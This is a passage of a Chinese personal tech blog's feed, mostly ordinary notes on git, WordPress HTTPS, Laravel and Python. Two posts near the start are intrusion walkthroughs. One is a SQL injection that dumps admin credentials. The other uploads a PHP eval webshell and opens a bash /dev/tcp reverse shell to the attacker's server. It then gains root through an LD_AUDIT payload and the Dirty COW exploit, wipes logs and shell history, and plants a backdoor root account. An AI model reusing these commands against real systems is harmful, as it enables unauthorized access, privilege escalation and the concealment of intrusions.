        <content type="html"><![CDATA[<p>发现一个网址<a href="http://www.x.com/news-view-3.html%EF%BC%8C%E9%80%9A%E8%BF%87%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8Esite:x.com%E6%89%BE%E5%88%B0%E4%BA%86%E5%85%B6%E5%BE%AE%E4%BF%A1%E9%A1%B5%E9%9D%A2id%E5%8F%82%E6%95%B0%E5%8F%AF%E6%B3%A8%E5%85%A5">http://www.x.com/news-view-3.html，通过搜索引擎site:x.com找到了其微信页面id参数可注入</a></p><pre class="language-none"><code class="language-none">http://www.x.com/wx/mobile.php?module=product&amp;userId=3&amp;MenuId=13&amp;action=view&amp;Id=1&nbsp;#页面正常http://www.x.com/wx/mobile.php?module=product&amp;userId=3&amp;MenuId=13&amp;action=view&amp;Id=1&nbsp;and 1=2 #页面不正常http://www.x.com/wx/mobile.php?module=product&amp;userId=3&amp;MenuId=13&amp;action=view&amp;Id=1&nbsp;and 1=1 #页面正常使用http://x.com/wx/mobile.php?module=product&amp;userId=3&amp;MenuId=13&amp;action=view&amp;Id=1&nbsp;and 1=2 order&nbsp;by&nbsp;n--判断出字段数，这里判断出来是8使用http://x.com/wx/mobile.php?module=product&amp;userId=3&amp;MenuId=13&amp;action=view&amp;Id=1&nbsp;and 1=2 union&nbsp;select&nbsp;1,2,3,4,5,6,7,8--判断出可显示在页面上的字段，这里是2和6使用http://x.com/wx/mobile.php?module=product&amp;userId=3&amp;MenuId=13&amp;action=view&amp;Id=1&nbsp;and&nbsp;1=2&nbsp;union select&nbsp;1,@@version,3,4,5,user(),7,8--得到数据库版本和当前用户(当前数据库同理):mysql：5.0.95   sq_praticcnc@x.x.x.x  使用http://www.x.com/wx/mobile.php?module=product&amp;userId=3&amp;MenuId=13&amp;action=view&amp;Id=1%20and%201=2%20union%20select%201,concat(group_concat(distinct+table_name)),3,4,5,user(),7,8%20from%20information_schema.COLUMNS%20where%20column_name%20like%20%27%word%%27%20and%20table_schema=%27sq_praticcnc%27--利用information_schema查询想要的数据库名，表名，列名利用查到的数据库名，表名，列名查询数据http://www.x.com/wx/mobile.php?module=product&amp;userId=3&amp;MenuId=13&amp;action=view&amp;Id=1%20and%201=2%20union%20select%201,concat_ws(0x3a,id,user,pass),3,4,5,user(),7,8%20from%20sq_praticcnc.admin%20limit%200,1--</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>记:从文件上传漏洞到获得root权限</title>
      <link href="/2018/04/18/wen-jian-shang-chuan-lou-dong-dao-huo-de-root-quan-xian/"/>
      <url>/2018/04/18/wen-jian-shang-chuan-lou-dong-dao-huo-de-root-quan-xian/</url>
      
        <content type="html"><![CDATA[<h2 id="1-信息搜集"><a href="#1-信息搜集" class="headerlink" title="1.信息搜集"></a>1.信息搜集</h2><ol><li> nmap扫描得到 21/tcp open ftp vsftpd 2.2.2 22/tcp open ssh OpenSSH 5.3 (protocol 2.0) 80/tcp open http Apache httpd 2.4.12 ((Unix) OpenSSL/1.0.1e-fips) 3306/tcp open mysql MySQL 5.6.26-log</li><li> nessus 扫描没什么可利用</li><li> 通过旁站扫描没有发现旁站，子域名也未查询到，通过Googlehack发现子目录下有其他站点。</li><li> 浏览主站，脚本语言应该是php，使用了框架。</li><li> 有phpmyadmin管理页面</li></ol><h2 id="2-web漏洞利用"><a href="#2-web漏洞利用" class="headerlink" title="2. web漏洞利用"></a>2. web漏洞利用</h2><ol><li> 主站是一个类似于商城的系统，提供注册登录功能。先尝试了sql注入，没有效果，技艺不精。</li><li>然后注册是提供头像上传的，于是选择一个图片上传抓包发现前端将图片重绘后使用base64格式上传。尝试修改数据包，将php一句话base64编码后替换原数据上传,&nbsp; 个人信息页面头像处拿到地址，成功拿到webshell <pre class="language-none"><code class="language-none">格式：data:[&lt;mediatype&gt;][;base64],&lt;data&gt;图片文件格式：data:image/jpeg;base64,&lt;base64data&gt;构造后：data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk/Pg==//PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk/Pg== 是&lt;?php @eval($_POST['cmd'])?&gt; 的base64编码形式</code></pre></li><li> 利用注册的账号登录进去，发现里面仍然提供更换照片功能。再次抓包发现是直接上传文件的方式。（非base64编码后上传）</li><li> 前端做了验证只能上传图片类型文件，上传jpg后缀一句话木马，使用burpsuit拦截后修改文件名后缀为php，成功上传。回到个人信息页面得到php一句话木马地址。使用菜刀连接上得到webshell</li></ol><h2 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h2><ol><li>提权过程试了好几种方法。使用反向连接得到webshell，得到内核版本等信息 <pre class="language-none"><code class="language-none">#公网服务器使用nc监听nc -lvvp 1234#目标机器上执行命令 bash -i &gt;&amp; /dev/tcp/公网服务器IP/端口 0&gt;&amp;1</code></pre> <pre class="language-none"><code class="language-none">[www@centos]$ whoamiwww[www@centos]$ uname -auname -aLinux centos 2.6.32-431.el6.x86_64 #1 SMP Fri Nov 22 03:15:09 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux[www@centos]$ lsb_release -alsb_release -aLSB Version::base-4.0-amd64:base-4.0-noarch:core-4.0-amd64:core-4.0-noarch:graphics-4.0-amd64:graphics-4.0-noarch:printing-4.0-amd64:printing-4.0-noarchDistributor ID:CentOSDescription:CentOS release 6.5 (Final)Release:6.5Codename:Final[www@centos]$ python -c 'import pty;pty.spawn("/bin/sh")'&nbsp;#模拟tty</code></pre></li><li>首先尝试了mysql的udf提权，恰好3306端口也是开放的。直接使用了sqlmap <pre class="language-none"><code class="language-none">sqlmap -d mysql://root:&lt;passwd&gt;@IP:PORT/DBname --os-shell#然后选择操作系统位数</code></pre> 然而并未成功，使用ps aux查看发现mysql是以mysql用户启动的，没有权限写plugin目录</li><li>然后尝试利用/tmp结合ping提权（suid） <pre class="language-none"><code class="language-none">find / -user root -perm -4000 -print 2&gt;/dev/null   #查找具有suid权限的文件cd /tmpmkdir exploitln /bin/ping /tmp/exploit/targetexec 3&lt; /tmp/exploit/target#把/tmp/exploit/target定义为文件描述符3rm -rf /tmp/exploit/#建立payload.c**********************************************void __attribute__((constructor)) init(){     setuid(0);     system("/bin/bash");}***********************************************gcc -W -fPIC -shared -o /tmp/exploit payload.cLD_AUDIT="\$ORIGIN" exec /proc/self/fd/3  #定义环境变量</code></pre> 但是不知道为什么前面所有的都执行正常 ，最后一句执行完后连接直接断开了，无奈换其他方法。</li><li>使用“Dirty COW”漏洞exp提权 <pre class="language-none"><code class="language-none">[www@centos tmp]$ curl https://www.exploit-db.com/download/40839 &gt; exp.c  #下载exp代码&lt;$ curl https://www.exploit-db.com/download/40839 &gt; exp.c                      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100  5006  100  5006    0     0   3768      0  0:00:01  0:00:01 --:--:--  6476[www@centos tmp]$ gcc -pthread exp.c -o exp -lcrypt  #编译gcc -pthread exp.c -o exp -lcrypt[www@centos tmp]$ ./exp   #执行./expPlease enter the new password: testtest   #输入密码，用户名默认firefart/etc/passwd successfully backed up to /tmp/passwd.bakComplete line:firefart:fiJIjOetSxcCE:0:0:pwned:/root:/bin/bashmmap: **********ptrace 0Done! Check /etc/passwd to see if the new user was created.You can log in with the username 'firefart' and the password 'testtest'.DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd  #通过在etc/passwd下添加ROOT权限的用户</code></pre></li><li>然后使用ssh工具成功登上 <pre class="language-none"><code class="language-none">[firefart@centos ~]# iduid=0(firefart) gid=0(root) groups=0(root)[firefart@centos ~]#</code></pre></li></ol><h2 id="4-清理及其他"><a href="#4-清理及其他" class="headerlink" title="4.清理及其他"></a>4.清理及其他</h2><ol><li>清理登录信息 等日志 <pre class="language-none"><code class="language-none">#清理其他记录日志access_log  error_logecho &gt; /var/log/wtmpecho &gt; /var/log/btmpecho &gt;~/.bash_historyhistory -c 使用sudo可用for i in `find . -name "*log*"`; do&nbsp;cat /dev/null &gt;$i; donesudo&nbsp;cp&nbsp;/dev/null&nbsp;&gt;&nbsp;.bash_historyfind a -exec echo "test:fiJIjOetSxcCE:34:0:pwned:/root:/bin/bash"&gt;&gt;/etc/passwd \; #给find设置suid提权创建用户</code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>apache虚拟主机设置laravel目录到public下出现500</title>
      <link href="/2018/03/16/apache-xu-ni-zhu-ji-she-zhi-laravel-mu-lu-dao-public-xia-chu-xian-500/"/>
      <url>/2018/03/16/apache-xu-ni-zhu-ji-she-zhi-laravel-mu-lu-dao-public-xia-chu-xian-500/</url>
      
        <content type="html"><![CDATA[<p>在使用laravel（5.5）搭建网站的时候，使用lnmp的vhost add，直接定位到laravel/public目录。重启Apache服务后出现500 原因可能有以下几点</p><ol><li> storage;bootstrap/cache无权限</li><li> 虚拟主机配置中的<strong>open_basedir也被设置到了public目录下，导致php无法访问上层目录</strong></li><li> 没有配置转发规则</li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python 文件读取写入及int转str</title>
      <link href="/2018/01/21/python-wen-jian-du-qu-xie-ru-ji-int-zhuan-str/"/>
      <url>/2018/01/21/python-wen-jian-du-qu-xie-ru-ji-int-zhuan-str/</url>
      
        <content type="html"><![CDATA[<p>读取写入文件：</p><pre class="language-none"><code class="language-none">打开函数file_object = open("filename",'mode')读取函数file_object.read(size)&nbsp;&nbsp;#读取指定大小字符，未指定这是整个文件file_object.readline()&nbsp;&nbsp;#读取一行file_object.readlines()&nbsp;&nbsp;#读取全文，自动分行file_object.write()  #写入文件，关闭时才会从缓冲区写入file_object.close()  #关闭文件</code></pre><hr><p>int,str互转</p><pre class="language-none"><code class="language-none">text = str(1234)text = '1234' num = int('1234')num = 1234</code></pre><p>在import了os，sys模块后，使用str将int转为string会报错 原因1：变量名不可重复用&nbsp; 2：已经被预先定义 可以使用</p><p>bytes([int]) #int转为str</p><p>若是需要转为Unicode编码，需要在前面写上</p><p><strong>import</strong> os<br><strong>import</strong> sys</p><p>reload(sys)<br>sys.setdefaultencoding(<strong>‘utf-8’</strong>)</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统逻辑地址转换</title>
      <link href="/2017/12/21/cao-zuo-xi-tong-luo-ji-di-zhi-zhuan-huan/"/>
      <url>/2017/12/21/cao-zuo-xi-tong-luo-ji-di-zhi-zhuan-huan/</url>
      
        <content type="html"><![CDATA[<p>某系统程序空间与物理空间都是2GB，页面大小为4KB。已知某进程的页表如下,请编写程序模拟分页系统的地址变换过程。要求分为公式法和硬拼法两种方式计算并对比。 <img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2017/12/486BF715-D2ED-4B65-BFF0-191E73326F25.jpg"></p><pre class="language-none"><code class="language-none">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include&lt;math.h&gt;#define PageSize 4096//自行判断地址是否越界int main() {    int BlockNum[10]={32102,443217,6723,8985,11238,29065,234205,45812,240561,300451};    int logicalAddress;    printf("请输入合法逻辑地址：");    scanf("%d",&amp;logicalAddress);    printf("公式法得物理地址为：%d\n",           BlockNum[logicalAddress/PageSize]*PageSize + logicalAddress%PageSize);    printf("硬拼法得物理地址为：%d\n",           ((BlockNum[(logicalAddress &gt;&gt; 12)] &lt;&lt; 12)  ((logicalAddress &lt;&lt; 20) &gt;&gt; 20)));    return 0;}</code></pre>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>lnmp+centos+WordPress配置https</title>
      <link href="/2017/12/17/lnmpcentoswordpress-pei-zhi-https/"/>
      <url>/2017/12/17/lnmpcentoswordpress-pei-zhi-https/</url>
      
        <content type="html"><![CDATA[<p>环境：centOS7.0+lnmp搭建Apache下的Web服务，运行WordPress</p><h4 id="腾讯云给出的方法"><a href="#腾讯云给出的方法" class="headerlink" title="腾讯云给出的方法"></a>腾讯云给出的方法</h4><h4 id="1-1-获取证书"><a href="#1-1-获取证书" class="headerlink" title="1.1 获取证书"></a>1.1 获取证书</h4><p>Apache文件夹内获得证书文件 1_root_bundle.crt，2_<a href="http://www.domain.com/_cert.crt">www.domain.com\_cert.crt</a> 和私钥文件 3_<a href="http://www.domain.com.key/">www.domain.com.key</a>, 1_root_bundle.crt 文件包括一段证书代码 “—–BEGIN CERTIFICATE—–”和“—–END CERTIFICATE—–”, 2_<a href="http://www.domain.com/_cert.crt">www.domain.com\_cert.crt</a> 文件包括一段证书代码 “—–BEGIN CERTIFICATE—–”和“—–END CERTIFICATE—–”, 3_<a href="http://www.domain.com.key/">www.domain.com.key</a> 文件包括一段私钥代码“—–BEGIN RSA PRIVATE KEY—–”和“—–END RSA PRIVATE KEY—–”。</p><h4 id="1-2-证书安装"><a href="#1-2-证书安装" class="headerlink" title="1.2 证书安装"></a>1.2 证书安装</h4><p>编辑Apache根目录下 conf/httpd.conf 文件， 找到&nbsp;<code>#LoadModule ssl_module modules/mod_ssl.so</code>&nbsp;和&nbsp;<code>#Include conf/extra/httpd-ssl.conf</code>，去掉前面的<code>#</code>号注释； 编辑Apache根目录下 conf/extra/httpd-ssl.conf 文件，修改如下内容：</p><pre class="language-none"><code class="language-none">&lt;VirtualHost www.domain.com:443&gt;    DocumentRoot "/var/www/html"    ServerName www.domain.com    SSLEngine on    SSLCertificateFile /usr/local/apache/conf/2_www.domain.com_cert.crt    SSLCertificateKeyFile /usr/local/apache/conf/3_www.domain.com.key    SSLCertificateChainFile /usr/local/apache/conf/1_root_bundle.crt&lt;/VirtualHost&gt;</code></pre><p>配置完成后，重新启动 Apache 就可以使用<code>https://www.domain.com</code>来访问了。</p><hr><p>前面是腾讯云给出的配置方法，如果无法正常执行，则去掉 conf/extra/httpd-ssl.conf 中添加的代码，改用lnmp vhost add 添加完虚拟主机后，在 conf/vhost中刚生成的*.conf文件中的内容修改为如下配置信息</p><pre class="language-none"><code class="language-none">NameVirtualHost *:443&lt;VirtualHost *:443&gt;ServerAdmin webmaster@example.comphp_admin_value open_basedir "/home/wwwroot:/tmp/:/var/tmp/:/proc/"DocumentRoot "/home/wwwroot"ServerName example.comSSLEngine onSSLCertificateFile /usr/local/apache/conf/2_example.com.crtSSLCertificateKeyFile /usr/local/apache/conf/3_example.com.keySSLCertificateChainFile /usr/local/apache/conf/1_example.com.crtErrorLog "/home/wwwlogs/y-error_log"CustomLog "/home/wwwlogs/y-access_log" combined&lt;Directory "/home/wwwroot"&gt;    SetOutputFilter DEFLATE    Options FollowSymLinks    AllowOverride All    Order allow,deny    Allow from all    DirectoryIndex index.html index.php&lt;/Directory&gt;&lt;/VirtualHost&gt;</code></pre><p>重启Apache服务，则可以通过https方式访问。</p><h3 id="3-设置WordPress以HTTPS方式全局访问"><a href="#3-设置WordPress以HTTPS方式全局访问" class="headerlink" title="3. 设置WordPress以HTTPS方式全局访问"></a>3. 设置WordPress以HTTPS方式全局访问</h3><p>1.进入WP后台，进入设置-常规 将WordPress地址（URL）、站点地址（URL）两项修改为：https。 通过上面的设置，绝大部分导航中的链接就由wordpress系统自动改为HTTPS版本。 2、对于正文中的内部链接需要手工修改，修改的方法有两种： 1）直接在数据库中更新，更新的sql如下：</p><blockquote><pre class="language-none"><code class="language-none">update wp_posts set post_content = replace(post_content, ‘http://example.com/’,‘https://example.com/’)</code></pre></blockquote><p>对于数据库不熟悉的站长不推荐这种方法，对数据库错误的更新对网站可能是毁灭性的打击，建议更新前最好备份数据库。 2） 登录和后台强制开启SSL 通过修改WP-config.php文件，直接在文件末尾加入以下两行代码： /* 强制后台和登录使用 SSL */</p><blockquote><pre class="language-none"><code class="language-none">define('FORCE_SSL_LOGIN', true);define('FORCE_SSL_ADMIN', true);</code></pre></blockquote><h2 id="整站301跳转"><a href="#整站301跳转" class="headerlink" title="整站301跳转"></a>整站301跳转</h2><p>在.htaccess文件添加如下代码：</p><blockquote><pre class="language-none"><code class="language-none">RewriteEngine OnRewriteCond %{SERVER_PORT} 80RewriteRule ^(.*)$ https://www.watch-life.net/$1 [R=301,L]RewriteCond %{HTTP_HOST} ^watch-life.net [NC]RewriteRule ^(.*)$ https://www.watch-life.net/$1 [L,R=301]</code></pre></blockquote><p>以上代码，更换相应的域名即可使用。注意修改或增加配置代码后，需要重启web 服务器。重启后，访问原来HTTP的版本，看是否301跳转为HTTPS的版本。</p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机二级web知识点总结</title>
      <link href="/2017/11/13/ji-suan-ji-er-ji-web-zhi-shi-dian-zong-jie/"/>
      <url>/2017/11/13/ji-suan-ji-er-ji-web-zhi-shi-dian-zong-jie/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/AspirePig/notes/blob/master/2%E7%BA%A7web%E6%8A%80%E6%9C%AF/2%E7%BA%A7web%E6%8A%80%E6%9C%AF.md">https://github.com/AspirePig/notes/blob/master/2%E7%BA%A7web%E6%8A%80%E6%9C%AF/2%E7%BA%A7web%E6%8A%80%E6%9C%AF.md</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>各类发送请求方法</title>
      <link href="/2017/11/08/ge-lei-fa-song-qing-qiu-fang-fa/"/>
      <url>/2017/11/08/ge-lei-fa-song-qing-qiu-fang-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="ajax请求"><a href="#ajax请求" class="headerlink" title="ajax请求"></a>ajax请求</h1><pre class="language-none"><code class="language-none">GET请求：var url = '/query.php'var xmlhttp;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function(){    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)    {        var req = xmlhttp.responseText;        document.getElementById("station").innerHTML = req;    }}xmlhttp.open("GET",url,true);xmlhttp.setRequestHeader("host","baidu.com");xmlhttp.send();POST请求var xmlhttp;xmlhttp=new XMLHttpRequest();var payload = "pass_key=11321";xmlhttp.onreadystatechange=function(){    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)    {      document.getElementById("myDiv").innerHTML=xmlhttp.responseText;    }}xmlhttp.open("POST","/try/ajax/demo_post.php",true);xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");xmlhttp.send(payload);</code></pre><h1 id="Python请求"><a href="#Python请求" class="headerlink" title="Python请求"></a>Python请求</h1><pre class="language-none"><code class="language-none">get请求import requests headers = {'content-type': 'application/json',           'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0)'} r = requests.get('https://api.github.com/some/endpoint',  headers=headers)print(r.text)POST请求import requests data = {'some': 'data'}headers = {'content-type': 'application/json',           'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0)'} r = requests.post('https://api.github.com/some/endpoint', data=data, headers=headers)print(r.text)</code></pre>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
          <category> python </category>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> python </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows server 安装支持php+mysql的web服务器</title>
      <link href="/2017/10/08/windows-server2012-an-zhuang-iisphpmysql-zu-cheng-web-fu-wu-qi/"/>
      <url>/2017/10/08/windows-server2012-an-zhuang-iisphpmysql-zu-cheng-web-fu-wu-qi/</url>
      
        <content type="html"><![CDATA[<p>iis+php不适合访问人数特别多的情况， <a href="http://www.jb51.net/article/101449_all.htm">http://www.jb51.net/article/101449_all.htm</a> Apache+php可用于大型网站 <a href="http://www.cnblogs.com/Li-Cheng/p/4381797.html">http://www.cnblogs.com/Li-Cheng/p/4381797.html</a></p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git常用命令</title>
      <link href="/2017/09/03/git-chang-yong-ming-ling/"/>
      <url>/2017/09/03/git-chang-yong-ming-ling/</url>
      
        <content type="html"><![CDATA[<pre class="language-none"><code class="language-none">git init   //初始化本地仓库git  add  //添加文件到暂存区git add .  //添加工作区所有修改过的或新建的文件到暂存区（删除除外）git commit -m "提交描述"   //提交暂存区的内容到版本中git status  //查看git状态git log  //查看提交日志  --graph可以查看分支合并图git reset --hard HEAD~N/HEAD^/前六位指纹  //版本回退git reflog  //记录每一次git命令git diff  //比较是工作目录和暂存区域快照(index)之间的差异git reset HEAD file   //暂存区的修改撤销掉（unstage），重新放回工作区git checkout -- 文件   //回到最近的一次git commit 或 git add 时git rm  //删除文件git mv  //移动，重命名文件目录或软连接git pull --rebase origin master  //分支衍合链接远程仓库方法见上一篇文章https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/misc/267.htmlgit&nbsp;clone&nbsp;git@github.com:用户名/项目名.git&nbsp;&nbsp;&nbsp;//从远程仓库克隆项目到本地git checkout -b 分支名 //创建并切换分支，相当于如下命令git&nbsp;branch&nbsp;分支名git&nbsp;checkout&nbsp;分支名git&nbsp;branch&nbsp;&nbsp;//查看当前分支git checkout master  //切换到master分区git&nbsp;merge&nbsp;分支名&nbsp;&nbsp;//合并某分支到当前分支git merge --no-ff -m "merge with no-ff" dev  //强制禁用快速合并模式git&nbsp;branch&nbsp;-d&nbsp;&nbsp;分支名&nbsp;&nbsp;//删除分支git&nbsp;stash&nbsp;&nbsp;&nbsp;//暂时存储工作区git stash list  //查看存储的工作区git stash apply&nbsp;&nbsp;//恢复工作区（不删除）git stash drop  //删除暂存工作区的内容git&nbsp;stash&nbsp;pop&nbsp;&nbsp;&nbsp;//恢复暂存区的内容并删除stashgit branch -D  &lt;分支名&gt;  //强制删除分支git&nbsp;remote&nbsp;-v&nbsp;//查看远程仓库信息git&nbsp;push&nbsp;origin&nbsp;master&nbsp;&nbsp;//推送maste分区到origin远程库git branch --set-upstream dev origin/dev  //设置分支与远程库分支的绑定git&nbsp;tag&nbsp;v1.0&nbsp;&nbsp;//给commit打标签  -d：删除标签git tag -a v0.1 -m "version 0.1 released" 3628164&nbsp;&nbsp;//创建带有指定说明的标签&nbsp;git&nbsp;show&nbsp;&lt;tagname&gt;&nbsp;//显示信息git push origin &lt;tagname&gt;&nbsp;&nbsp;//推送标签到远程git&nbsp;push&nbsp;origin&nbsp;--tags&nbsp;&nbsp;&nbsp;//推送所有标签到远程git push origin :refs/tags/v0.9  //删除远程标签  需要先删除本地标签git config --global color.ui true&nbsp;&nbsp;//命令显示颜色git add -f App.class&nbsp;&nbsp;&nbsp;//强制添加到gitgit check-ignore -v App.class&nbsp;&nbsp;&nbsp;//检查.gitignoregit config --global alias.st status  //配置别名示例不删除本地删除远程的方法git rm -r --cached a/2.txt // 删除a目录下的2.txt文件 git commit -m "删除a目录下的2.txt文件" // commitgit push git&nbsp;push&nbsp;-f&nbsp;&nbsp;&nbsp;//强制上传，覆盖原数据</code></pre>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
          <category> github </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
            <tag> github </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac下命令行git链接github</title>
      <link href="/2017/09/03/mac-ming-ling-xing-yu-github-lian-jie/"/>
      <url>/2017/09/03/mac-ming-ling-xing-yu-github-lian-jie/</url>
      
        <content type="html"><![CDATA[<h3 id="第一步：注册GitHub账号，略过"><a href="#第一步：注册GitHub账号，略过" class="headerlink" title="第一步：注册GitHub账号，略过"></a>第一步：注册GitHub账号，略过</h3><h3 id="第二步：mac上安装或更新git"><a href="#第二步：mac上安装或更新git" class="headerlink" title="第二步：mac上安装或更新git"></a>第二步：mac上安装或更新git</h3><blockquote><p>检查是否安装了git，在终端中使用命令</p><pre class="language-none"><code class="language-none">git&nbsp;--version</code></pre><p>如果出现git版本，则已安装git，与<a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a>比较版本是否需要升级，若未安装，则直接下载安装</p></blockquote><h3 id="第三步：git使用ssh认证与连接"><a href="#第三步：git使用ssh认证与连接" class="headerlink" title="第三步：git使用ssh认证与连接"></a>第三步：git使用ssh认证与连接</h3><blockquote><p>首先备份~/.ssh目录下的已有密钥（当然的确定自己是否已经安装了ssh） 接着配置git的username和useremail</p><pre class="language-none"><code class="language-none">git config --global user.name "xxx"git config --global user.email "xxxt@qq.com"</code></pre><p>然后cd到~/.ssh文件夹下执行命令</p><pre class="language-none"><code class="language-none">ssh-keygen -t rsa -C “xxxxt@qq.com”</code></pre><p>执行完以后，在github的设置中新建一个ssh key，内容就是在~/.ssh中生成的id_rsa.pub文件中的所有字符。 <img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2017/09/0970DF90-221C-4031-B602-4B8AEA26FD8F-256x300.jpg"><img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2017/09/81CCA7FB-DB7A-4BAF-B325-C95017510633.jpg"></p></blockquote><h3 id="第四步：测试是否连接成功"><a href="#第四步：测试是否连接成功" class="headerlink" title="第四步：测试是否连接成功"></a>第四步：测试是否连接成功</h3><blockquote><p>在github上新建一个仓库（先不勾选产生README.md），接着本地终端cd进入自己项目文件夹执行以下命令</p><pre class="language-none"><code class="language-none">git init      //初始化git add *    //添加所有文件git commit -m "描述"  </code></pre><p>然后在github仓库中上找到ssh方式连接的地址 <img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.com/wp-content/uploads/2017/09/85879FD3-AE88-46CF-808E-19CD1A45A165.jpg"> 复制连接，在终端中执行命令</p><pre class="language-none"><code class="language-none">git remote add origin git@github.com:AspirePig/test.git&nbsp;&nbsp;&nbsp;//关联项目</code></pre><p>push项目到github</p><pre class="language-none"><code class="language-none">git push -u origin master</code></pre></blockquote>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
          <category> tools </category>
          
          <category> OS X </category>
          
          <category> github </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> github </tag>
            
            <tag> tools </tag>
            
            <tag> OS X </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WordPress替换域名</title>
      <link href="/2017/07/22/wordpress-ti-huan-yu-ming/"/>
      <url>/2017/07/22/wordpress-ti-huan-yu-ming/</url>
      
        <content type="html"><![CDATA[<pre class="language-none"><code class="language-none">UPDATE wp_options SET option_value = replace(option_value, 'http://old.cn','http://new.cn') ;UPDATE wp_posts SET post_content = replace(post_content, 'http://old.cn','http://new.cn') ;UPDATE wp_comments SET comment_content = replace(comment_content, 'http://old.cn', 'http://new.cn') ;UPDATE wp_comments SET comment_author_url = replace(comment_author_url, 'http://old.cn', 'http://new.xxxx.cn') ;</code></pre>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>charles os x下抓取iPhone等移动设备数据包</title>
      <link href="/2017/06/25/charles-os-x-xia-zhua-qu-iphone-deng-yi-dong-she-bei-shu-ju-bao/"/>
      <url>/2017/06/25/charles-os-x-xia-zhua-qu-iphone-deng-yi-dong-she-bei-shu-ju-bao/</url>
      
        <content type="html"><![CDATA[<p><a href="http://blog.devtang.com/2015/11/14/charles-introduction/#%E7%9B%AE%E5%BD%95%E5%8F%8A%E6%9B%B4%E6%96%B0%E8%AF%B4%E6%98%8E">http://blog.devtang.com/2015/11/14/charles-introduction/#目录及更新说明</a></p>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
          <category> OS X </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>使用laravel重写留言板</title>
      <link href="/2017/05/01/shi-yong-laravel-chong-xie-liu-yan-ban/"/>
      <url>/2017/05/01/shi-yong-laravel-chong-xie-liu-yan-ban/</url>
      
        <content type="html"><![CDATA[<p>链接<a href="https://github.com/AspirePig/gestboard">https://github.com/AspirePig/gestboard</a></p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
          <category> python </category>
          
          <category> windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>acer vn7 591在uefi+gtp模式下安装win7</title>
      <link href="/2017/03/30/acer-zai-uefigtp-mo-shi-xia-an-zhuang-win7/"/>
      <url>/2017/03/30/acer-zai-uefigtp-mo-shi-xia-an-zhuang-win7/</url>
      
        <content type="html"><![CDATA[<p>工具：</p><ol><li> &nbsp;MSDN原版win7x64 sp1的iso</li><li> winntsetup，最新版本3.8beta3以上</li><li> intel核心显卡驱动，intel官网下最新的适合4代intel cpu核心显卡。 （链接: <a href="http://pan.baidu.com/s/1jIFRUAU">http://pan.baidu.com/s/1jIFRUAU</a> 密码: ux7b</li><li> 虚拟光驱软件如：UltraISO</li></ol><p>环境：pe或者其他Windows版本 操作步骤：</p><ol><li> bios的安全启动关闭</li><li> 解压Intel核心显卡驱动中的Graphics文件夹出来</li><li> 准备好efi分区</li><li> 使用winntsetup如下设置 <img src="https://aspirepig-1251964320.cos.ap-shanghai.myqcloud.comwp-content/uploads/2017/03/@1AUXL1NINHO5V0S-300x266.png"> 开始后确定就好</li></ol>]]></content>
      
      
      <categories>
          
